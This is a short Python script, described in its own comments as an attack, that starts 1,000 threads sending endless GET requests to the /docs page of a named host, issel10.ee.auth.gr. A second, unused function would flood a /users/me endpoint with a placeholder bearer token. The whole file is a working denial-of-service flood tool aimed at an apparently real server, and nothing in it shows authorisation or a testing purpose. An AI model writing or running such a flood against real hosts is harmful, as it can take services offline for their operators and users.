import threading
import requests

# Attack the /docs page
def get_docs(target):
    while True:       
        # Make the GET request
        response = requests.get(target)

        # Check the response status code
        if response.status_code == 200:
            print("GET /docs: Request successful!")
            print(response.json())  # If the response is JSON
        else:
            print(f"Request failed with status code {response.status_code}")
            print(response.text)  # Print the response content

# Attack the /users/me page
def get_me():
     while True:
        target = "https://issel10.ee.auth.gr:/users/me"

        # Define the headers
        headers = {
            "accept": "application/json",
            "Authorization": "Bearer <token>"
        }
        
        # Make the GET request
        response = requests.get(target, headers=headers)

        # Check the response status code
        if response.status_code == 200:
            print("GET /users/me: Request successful!")
            print(response.json())  # If the response is JSON
        else:
            print(f"Request failed with status code {response.status_code}")
            print(response.text)  # Print the response content

def main():
    # Set target url to attack the /docs page
    target = "https://issel10.ee.auth.gr/docs"
    
    # Create many threads
    for i in range(1000):
        thread = threading.Thread(target=get_docs, args=(target,))
        thread.start()

if __name__ == "__main__":
    main()